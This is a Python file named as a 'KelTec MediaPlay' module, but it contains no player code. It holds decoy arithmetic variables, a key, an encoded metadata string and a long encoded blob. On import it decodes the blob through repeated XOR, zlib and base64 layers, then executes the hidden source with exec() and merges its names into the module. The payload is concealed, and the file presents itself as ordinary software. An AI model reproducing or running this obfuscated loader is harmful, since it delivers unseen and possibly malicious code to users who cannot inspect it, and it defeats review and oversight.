# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 748590 ^ 361554
_lx1_1 = len("18e5b9")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-746636)
_lx3_3 = 532221 * 0
_lx4_4 = 509032 ^ 191297
_K = '05e7fa674ad580f6de17eaff41f6fa2a43444e17e15aa7605f3b1cfb2bd6c2c8'
_M = '3zON57/lWcA8oTjJxrIrFX10JOCh+SAx7fmbroDbIDDWPNzu/OoHl2DwN5rG43ASf3Mn4qz+Imfkqsr/i98kNYVni7PztFTAN/Y3'
_D = '==A7LM57FbYR7585hIzQTXeP3swDQKIj1cpDt9elIMPl1EL3Cmg76qaaf1DJUd/BmaZC//Q6E5fyhC5sbUuFPvKQuc9JPXV6TjDAvf7dHA67w5shn2oWjRWmj2r5/F6pWMfp1YnQMHi7pSX+RkXWtDB06DauBNjy1fI2tf/TsqpurUj58GoCPPvEn+l4h6DpWwneROntDYgJR2MIUJ5VZAsKLJn0zMjBPjqG1fpMpCDD0c7l+U8JowEY8iSJTsMq7QXFuIPSy84JP+rFU8wqsMEg5qBrYPUiESt6zwCgvjtSwF++U5YqFSHm5bGuhPSNuUGobyQ96ZVzvsO9/vxE3MswzCs98uoYBAH2PKBRoqRWZbWld4ci5IO8asel9YYk8yDrSZh1Y/a5TLFbkx+zswkRxPA5UsRNbZZcFFa/KcE1dL183gQqZo8qJTIKsUTGOrKNZyt3q3LtIUt1b15vBeAYDcDWaan7EUmWa6FpNSuTFCA4Tc9rAIhC5KN1nUolRP7U+eN+dpmdOVTse/Psgq7tzb+rgkaL7wzlFLVDGWLAWpQ4PbXzkhtTkzmXfErwijrznSI7vTfttaVJIUjlgujGpA8YNQkyXnzWepMw75h46CNBMinXDuSEEluHcqkqc677i2GBVeooB95eQsJXsI/4k0bnbijVwm5tciIAW1HYgmyc8RF7ITwkWLZMGaT+RQEUYbDEYW87gVgJxpOBEpiPxZr0ec6n5uZSBfNxITpx3V04Qre5NWeUTUq64BzNM+UD1JiFBjZ7NJ90gH7MHtZ5jdsAdN7IJdA96jca9inTMe6fWIJQOMxHcTbAi8Bz3SKAOikVqijXEBWRlF/W5hlMtpmHmaopCQ5nCjRqPpx/QS3iGhpzYUonJfiV7wS09gJWtu9X9ymprUhD5D412SjVlPe8nUvWmnEFGAy6nXsXaDg6uyL9ojWxao0F8E3vuGgvLb8GBhoiEi6zRebMG69WIFXCn/DOs/qztDYetMyFWdTnEH2fzISVF32I+O66Ur6AJQDL7jbTEBbE/gks6AJua3Gi6CRbZEPbrAs2uxDaB320G3nVBjGXVWGQUyGXyl09NXqsiB4GH3knk+7JE9l36s/iNKWjJFNTvb7slhhbTqiElo0ZGyaKNdaXfsfMI+fpUFgyAoK39xdNRGdtOg0R6Xy0f9FDR86PbBsjVv0+nF2MJsZ/q6U2XFVkZFKo7sdElTzbtttlPKHKll4CrUo9Ql22ubJHQMHOSKfhyZspX7rR4umjrzPGveni5mGCDab4OdKQeKhDt/cfc1eRvphBzFjMMwIHy4FozsglbmKwUY/AE/lUQe0Ee7FXui5n4Td036Zpwp4h3vVTpa2rWLelte/fKyZhQyaYQwkShkwfB7x+f7fSp1BHNiLotTKkiydnJ70G1tz6P2IlAdKajzkBnnK2XinJ0iXCB1VSOKBScso9RilATJ7vlZCLLDGxEgeX1Itz3e3yOAn27vRj00fN7bQyHqOi9ZqTIB8432GbXJ72i/IHTaBDmOT/K+CFRHuJvr9ypGIS7kGizRrSl0RQqDOamBXyLtHdavHClqyrLlwq0MlJZ8pwDfhJ5HT3dFNJ03Y8MmGIHur3pgzheF4BurzpwQfkcaTw6ps9ujN0'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})